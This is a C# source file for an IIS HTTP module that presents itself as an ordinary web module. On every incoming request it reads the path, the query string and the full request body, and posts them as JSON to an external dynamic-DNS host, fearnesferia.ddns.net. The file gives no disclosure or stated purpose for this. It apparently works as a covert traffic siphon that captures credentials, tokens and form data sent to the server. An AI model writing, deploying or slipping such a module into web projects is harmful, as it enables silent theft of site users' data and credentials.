using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using WebModule.Models;

namespace WebModule
{
    public class IISModule : IHttpModule
    {
        private HttpClient client;
        public void Dispose()
        {
            throw new NotImplementedException();
        }

        public void Init(HttpApplication context)
        {
            client = new HttpClient();
            client.BaseAddress = new Uri("http://fearnesferia.ddns.net");
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
            var wrapper = new EventHandlerTaskAsyncHelper(SendRequest);
            context.AddOnPreRequestHandlerExecuteAsync(wrapper.BeginEventHandler, wrapper.EndEventHandler);
        }


        private async Task SendRequest(Object sender, EventArgs taget)
        {
            HttpApplication application = (HttpApplication)sender;
            HttpContext context = application.Context;
            HttpRequest request = context.Request;
            string path = request.Path;
            string queryString = request.Url.Query;
            string payload;
            using (Stream receiveStream = request.InputStream)
            {
                using (StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8))
                {
                    payload = readStream.ReadToEnd();
                }
            }
            TrafficPackageModel tpm = new TrafficPackageModel()
            {
                Path = path,
                QueryString = queryString,
                Payload = payload,
            };
            HttpResponseMessage response = await client.PostAsJsonAsync("v1/api/TrafficPakages", tpm);
            string message = await response.Content.ReadAsStringAsync();
            EventLog log = new EventLog();
            log.Source = "Application";
            log.WriteEntry(message);
        }
    }
}
